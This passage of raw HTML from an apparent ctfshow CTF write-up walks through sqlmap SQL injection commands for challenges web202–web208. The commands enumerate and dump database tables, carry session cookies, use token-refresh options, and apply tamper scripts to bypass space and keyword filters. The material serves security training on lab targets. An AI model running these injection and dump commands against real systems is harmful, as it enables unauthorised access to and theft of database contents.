-&lt;/span>&lt;span class="lnt">6
-&lt;/span>&lt;span class="lnt">7
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://c4669376-5f6c-4214-90a2-38647c73550a.challenge.ctf.show/api/&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://c4669376-5f6c-4214-90a2-38647c73550a.challenge.ctf.show/api/&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show -dbs
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://c4669376-5f6c-4214-90a2-38647c73550a.challenge.ctf.show/api/&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show -D ctfshow_web --tables
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://c4669376-5f6c-4214-90a2-38647c73550a.challenge.ctf.show/api/&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show -D ctfshow_web -T ctfshow_user --dump
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;h3 id="web203">web203
-&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;span class="lnt">2
-&lt;/span>&lt;span class="lnt">3
-&lt;/span>&lt;span class="lnt">4
-&lt;/span>&lt;span class="lnt">5
-&lt;/span>&lt;span class="lnt">6
-&lt;/span>&lt;span class="lnt">7
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://d3894a03-1770-455d-9da7-1894f0687aec.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show --batch
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://d3894a03-1770-455d-9da7-1894f0687aec.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show --dbs --batch
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://d3894a03-1770-455d-9da7-1894f0687aec.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show -D ctfshow_web --tables
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://d3894a03-1770-455d-9da7-1894f0687aec.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show -D ctfshow_web -T ctfshow_user --dump
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>路由不能写错，&lt;code>/api/&lt;/code>不接受PUT传参，始终有405错误，写成&lt;code>/api/index.php&lt;/code>就可以了&lt;/p>
-&lt;h3 id="web204">web204
-&lt;/h3>&lt;p>把Cookie带上就可以了&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;span class="lnt">2
-&lt;/span>&lt;span class="lnt">3
-&lt;/span>&lt;span class="lnt">4
-&lt;/span>&lt;span class="lnt">5
-&lt;/span>&lt;span class="lnt">6
-&lt;/span>&lt;span class="lnt">7
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://17a220a4-5488-4d09-9c20-ce4d851f6b32.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;ctfshow=f1a8dd82330be40c19146f968a9a61b3;PHPSESSID=qlkq87qii1p445gqkn6h4fi6o3&amp;#34;&lt;/span> --batch
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://17a220a4-5488-4d09-9c20-ce4d851f6b32.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;ctfshow=f1a8dd82330be40c19146f968a9a61b3;PHPSESSID=qlkq87qii1p445gqkn6h4fi6o3&amp;#34;&lt;/span> --dbs --batch
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://17a220a4-5488-4d09-9c20-ce4d851f6b32.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;ctfshow=f1a8dd82330be40c19146f968a9a61b3;PHPSESSID=qlkq87qii1p445gqkn6h4fi6o3&amp;#34;&lt;/span> -D ctfshow_web --tables --batch
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://17a220a4-5488-4d09-9c20-ce4d851f6b32.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;ctfshow=f1a8dd82330be40c19146f968a9a61b3;PHPSESSID=qlkq87qii1p445gqkn6h4fi6o3&amp;#34;&lt;/span> -D ctfshow_web -T ctfshow_user --dump --batch
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;h3 id="web205">web205
-&lt;/h3>&lt;p>每次查询之前会先去&lt;code>/api/getToken.php&lt;/code>，拿到Cookie再去查询&lt;code>PHPSESSID=9kfu8beesnj6mk7j0554lh8fgp&lt;/code>&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;span class="lnt">2
-&lt;/span>&lt;span class="lnt">3
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://664e502c-af1a-4845-aae9-0cee9c9ba258.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --safe-url&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://664e502c-af1a-4845-aae9-0cee9c9ba258.challenge.ctf.show/api/getToken.php&amp;#34;&lt;/span> --safe-freq&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;PHPSESSID=9kfu8beesnj6mk7j0554lh8fgp&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show -D ctfshow_web --tables
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://664e502c-af1a-4845-aae9-0cee9c9ba258.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --safe-url&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://664e502c-af1a-4845-aae9-0cee9c9ba258.challenge.ctf.show/api/getToken.php&amp;#34;&lt;/span> --safe-freq&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;PHPSESSID=9kfu8beesnj6mk7j0554lh8fgp&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show -D ctfshow_web -T ctfshow_flax --dump --batch
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;h3 id="web206">web206
-&lt;/h3>&lt;p>需要闭合，但是我写了一个没有闭合的payload也能打出来，只不过是Sqlmap给我时间盲注出来的&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://f60f42ca-9e5f-4cbc-9f79-ce46c88cd952.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --safe-url&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://f60f42ca-9e5f-4cbc-9f79-ce46c88cd952.challenge.ctf.show/api/getToken.php&amp;#34;&lt;/span> --safe-freq&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;PHPSESSID=khfj7v9mah0p28b43l00da7674&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show -D ctfshow_web --tables
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://baozongwi.xyz/p/sqlmap-usage/QQ20250505-173045.jpg"
-width="2109"
-height="928"
-srcset="https://baozongwi.xyz/p/sqlmap-usage/QQ20250505-173045_hu_8334044d5c75a9cf.jpg 480w, https://baozongwi.xyz/p/sqlmap-usage/QQ20250505-173045_hu_434cd19e740b2fa6.jpg 1024w"
-loading="lazy"
-alt="1"
-class="gallery-image"
-data-flex-grow="227"
-data-flex-basis="545px"
->&lt;/p>
-&lt;p>但是如果把闭合写了&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://f60f42ca-9e5f-4cbc-9f79-ce46c88cd952.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --safe-url&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://f60f42ca-9e5f-4cbc-9f79-ce46c88cd952.challenge.ctf.show/api/getToken.php&amp;#34;&lt;/span> --safe-freq&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;PHPSESSID=khfj7v9mah0p28b43l00da7674&amp;#34;&lt;/span> --prefix&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&amp;#39;)&amp;#34;&lt;/span> --suffix&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;#&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show -D ctfshow_web --tables
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>他就不会盲注而是直接打出来，不过前提是要知道payload的样子&lt;/p>
-&lt;p>&lt;img src="https://baozongwi.xyz/p/sqlmap-usage/QQ20250505-173258.jpg"
-width="2214"
-height="1058"
-srcset="https://baozongwi.xyz/p/sqlmap-usage/QQ20250505-173258_hu_1ca47153fd95b756.jpg 480w, https://baozongwi.xyz/p/sqlmap-usage/QQ20250505-173258_hu_12d9099e804f037a.jpg 1024w"
-loading="lazy"
-alt="1"
-class="gallery-image"
-data-flex-grow="209"
-data-flex-basis="502px"
->&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://f60f42ca-9e5f-4cbc-9f79-ce46c88cd952.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --safe-url&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://f60f42ca-9e5f-4cbc-9f79-ce46c88cd952.challenge.ctf.show/api/getToken.php&amp;#34;&lt;/span> --safe-freq&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;PHPSESSID=khfj7v9mah0p28b43l00da7674&amp;#34;&lt;/span> --prefix&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&amp;#39;)&amp;#34;&lt;/span> --suffix&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;#&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show -D ctfshow_web -T ctfshow_flaxc --columns --where&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --dump --threads&lt;span class="o">=&lt;/span>&lt;span class="m">5&lt;/span> --no-cast --time-sec&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --charset&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-{}.ctfshow&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>优化一下参数，即使这样子可能注入出来的东西不完整，但是够快&lt;/p>
-&lt;p>&lt;img src="https://baozongwi.xyz/p/sqlmap-usage/QQ20250505-174840.jpg"
-width="1661"
-height="927"
-srcset="https://baozongwi.xyz/p/sqlmap-usage/QQ20250505-174840_hu_225476e76e4f9d09.jpg 480w, https://baozongwi.xyz/p/sqlmap-usage/QQ20250505-174840_hu_65aae2238236121d.jpg 1024w"
-loading="lazy"
-alt="1"
-class="gallery-image"
-data-flex-grow="179"
-data-flex-basis="430px"
->&lt;/p>
-&lt;p>但是这样的命令跑不出来，线程加太大了，所以我又重新写了一下命令，用二分法和限制字符集，直接乱杀好吧&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;span class="lnt">2
-&lt;/span>&lt;span class="lnt">3
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://f60f42ca-9e5f-4cbc-9f79-ce46c88cd952.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --safe-url&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://f60f42ca-9e5f-4cbc-9f79-ce46c88cd952.challenge.ctf.show/api/getToken.php&amp;#34;&lt;/span> --safe-freq&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;PHPSESSID=khfj7v9mah0p28b43l00da7674&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show -D ctfshow_web --tables
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://35cc5129-ecff-4e45-a19d-f3058ea3909f.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --safe-url&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://35cc5129-ecff-4e45-a19d-f3058ea3909f.challenge.ctf.show/api/getToken.php&amp;#34;&lt;/span> --safe-freq&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;PHPSESSID=khfj7v9mah0p28b43l00da7674&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show -D ctfshow_web -T ctfshow_flaxc --dump --threads&lt;span class="o">=&lt;/span>&lt;span class="m">5&lt;/span> --charset&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-{}.&amp;#34;&lt;/span> --time-sec&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --binary-fields&lt;span class="o">=&lt;/span>flagv --no-cast
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;h3 id="web207">web207
-&lt;/h3>&lt;p>过滤了空格直接利用&lt;code>space2comment&lt;/code>绕过&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;span class="lnt">2
-&lt;/span>&lt;span class="lnt">3
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://7745522d-a1de-46a6-9352-f68081c99d84.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --safe-url&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://7745522d-a1de-46a6-9352-f68081c99d84.challenge.ctf.show/api/getToken.php&amp;#34;&lt;/span> --safe-freq&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;PHPSESSID=khfj7v9mah0p28b43l00da7674&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show --tamper&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;space2comment&amp;#34;&lt;/span> -D ctfshow_web --tables
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://7745522d-a1de-46a6-9352-f68081c99d84.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --safe-url&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://7745522d-a1de-46a6-9352-f68081c99d84.challenge.ctf.show/api/getToken.php&amp;#34;&lt;/span> --safe-freq&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;PHPSESSID=khfj7v9mah0p28b43l00da7674&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show --tamper&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;space2comment&amp;#34;&lt;/span> -D ctfshow_web -T ctfshow_flaxca --dump
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;h3 id="web208">web208
-&lt;/h3>&lt;p>虽然还是写着只过滤了空格，但是这里还是必须要用随便大小写关键字才能绕过&lt;code>randomcase&lt;/code>&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;span class="lnt">2
-&lt;/span>&lt;span class="lnt">3
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://04b302d1-1b4e-439c-8afd-8ce6d287c653.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --safe-url&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://04b302d1-1b4e-439c-8afd-8ce6d287c653.challenge.ctf.show/api/getToken.php&amp;#34;&lt;/span> --safe-freq&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;PHPSESSID=khfj7v9mah0p28b43l00da7674&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show --tamper&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;space2comment,randomcase&amp;#34;&lt;/span> -D ctfshow_web --tables
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
